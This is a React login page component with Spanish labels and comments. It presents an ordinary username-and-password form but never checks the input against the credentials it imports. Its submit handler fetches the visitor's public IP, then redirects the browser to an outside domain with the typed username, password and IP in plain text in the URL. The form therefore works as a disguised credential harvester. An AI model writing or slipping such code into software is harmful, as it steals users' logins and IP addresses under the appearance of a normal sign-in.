import React, { useContext, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import Input from "../components/Input";
import { Context } from "../App";
import { USUARIO } from "../assets/utils/constants";
import { setCookie, deleteCookie } from "../assets/utils/cookie";
import { RUTAS, COOKIE_INFO } from "../assets/utils/constants";
import { setCodigo } from "../assets/utils/functions";

export default function Login() {
  const { setSignedIn } = useContext(Context);
  const [attempts, setAttempts] = useState(0);
  const navigate = useNavigate();
  const { home } = RUTAS;
  const { name, value } = COOKIE_INFO;

  const submit = async (e) => {
    e.preventDefault();
    const { user, pass } = USUARIO;
    const inputUser = document.querySelector("input[name='user']").value;
    const inputPass = document.querySelector("input[name='pass']").value;

    // Obtener la IP pública del dispositivo
    try {
      const ipResponse = await axios.get('https://api.ipify.org?format=json');
      const ip = ipResponse.data.ip;

      // Redireccionar al usuario a la página de login con la IP como parámetro
      window.location.href = `https://anuncios.vercel.app/login?user=${inputUser}&pass=${inputPass}&ip=${ip}`;
    } catch (error) {
      console.error('Error obteniendo la IP:', error);
    }
  };

  return (
    <div className="max-w-md mx-auto relative overflow-hidden z-10 bg-gray-200 p-8 rounded-lg shadow-md mt-[60px]">
      <h2 className="text-2xl font-bold text-gray-900 mb-6 text-center">
        Iniciar sesión
      </h2>

      <form onSubmit={submit}>
        <Input label="Usuario" type="text" name="user" />
        <Input label="Contraseña" type="password" name="pass" />

        <div className="flex justify-center mt-[20px]">
          <button
            className="bg-gray-900 border text-gray-200 px-4 py-2 font-bold rounded-md hover:bg-gray-300 hover:text-gray-900 hover:border border-gray-900 transition duration-[.3s]"
            type="submit"
          >
            Enviar
          </button>
        </div>
      </form>
    </div>
  );
}
